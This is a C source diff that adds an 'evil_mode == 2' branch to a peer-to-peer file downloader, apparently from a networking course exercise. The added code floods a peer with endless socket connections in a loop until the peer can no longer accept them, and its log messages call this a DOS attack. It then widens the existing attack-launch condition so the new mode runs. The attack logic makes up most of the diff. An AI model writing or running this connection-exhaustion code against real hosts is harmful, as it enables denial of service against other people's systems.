@@ -532,6 +532,29 @@ static void task_download(task_t *t, task_t *tracker_task)
 		   && t->peer_list->port == listen_port)
 		goto try_again;
 
+	// Attack 2: attempt DOS attacks
+	if (evil_mode == 2) {
+		message("* Attacking %s:%d with '%s' DOS\n",
+			inet_ntoa(t->peer_list->addr), t->peer_list->port,
+			t->filename);
+		// try once
+		t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+		if (t->peer_fd == -1) {
+			error("* Cannot connect to peer: %s\n", strerror(errno));
+			goto try_again;
+		}
+		// attack repeatedly
+		while (1) {
+			t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+			if (t->peer_fd == -1) {
+				error("* Attack successful. Can no longer connect to peer: %s\n"
+					, strerror(errno));
+				// try again with another peer
+				goto try_again;
+			}
+		}
+	}
+
 	// Connect to the peer and write the GET command
 	message("* Connecting to %s:%d to download '%s'\n",
 		inet_ntoa(t->peer_list->addr), t->peer_list->port,
@@ -821,7 +844,7 @@ int main(int argc, char *argv[])
 	prev = NULL;
 
 	// Start downloader attacks in concurrent processes
-	if (evil_mode == 1) {
+	if (evil_mode == 1 || evil_mode == 2) {
 		strncpy(file, "cat0.jpg", 8);
 		file[8] = '\0';
 		// iterate through all three test files
